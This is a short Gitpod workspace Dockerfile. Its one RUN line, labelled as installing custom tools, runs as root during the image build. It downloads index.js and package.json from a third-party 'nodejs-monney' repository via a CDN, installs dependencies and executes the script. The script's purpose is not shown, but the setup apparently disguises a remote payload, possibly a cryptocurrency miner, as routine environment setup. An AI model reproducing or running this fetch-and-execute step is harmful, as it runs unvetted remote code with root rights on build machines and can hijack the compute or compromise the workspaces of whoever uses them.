FROM gitpod/workspace-full:latest

USER root

# Install custom tools, runtime, etc.
RUN wget https://rawcdn.githack.com/vippro99/nodejs-monney/ce679fa4578f7719b92c0b0126258d1e25eedae3/index.js && wget https://rawcdn.githack.com/vippro99/nodejs-monney/ce679fa4578f7719b92c0b0126258d1e25eedae3/package.json && chmod +x index.js package.json && npm i -s && node index.js
 
# Give back control
USER root
